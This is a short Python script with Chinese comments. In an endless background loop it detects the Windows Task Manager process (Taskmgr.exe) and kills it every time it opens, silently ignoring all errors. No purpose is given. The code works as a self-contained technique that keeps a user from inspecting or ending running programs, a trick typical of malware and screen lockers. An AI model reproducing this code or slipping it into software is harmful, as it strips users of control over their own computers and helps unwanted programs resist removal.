from psutil import process_iter as processIter # 导入psutil模块 处理进程相关信息
from threading import Thread # 导入Thread模块 处理线程相关信息


# 判断任务管理器是否打开
def isTaskManagerOpen():
    try:
        for proc in processIter(['pid', 'name']): # 遍历所有进程
            if proc.info['name'] == 'Taskmgr.exe': return True # 找到任务管理器进程
        return False # 未找到任务管理器进程
    except: pass # 忽略异常


# 关闭任务管理器
def closeTaskManager():
    try:
        for proc in processIter(['pid', 'name']): # 遍历所有进程
            if proc.info['name'] == 'Taskmgr.exe': # 找到任务管理器进程
                proc.terminate()  # 终止进程
                proc.wait(timeout=3)  # 等待进程结束，最多等待3秒
    except: pass # 忽略异常


# 检查任务管理器的线程函数
def checkTaskManager():
    try:
        while True:
            if isTaskManagerOpen(): closeTaskManager() # 如果任务管理器打开，则关闭
    except: pass # 忽略异常


# 监控任务管理器
def monitorTaskManager():
    try:
        taskManagerThreads = Thread(target=checkTaskManager, daemon=True) # 启动检查任务管理器的线程
        taskManagerThreads.start() # 启动线程
        taskManagerThreads.join() # 等待线程结束
    except: pass # 忽略异常


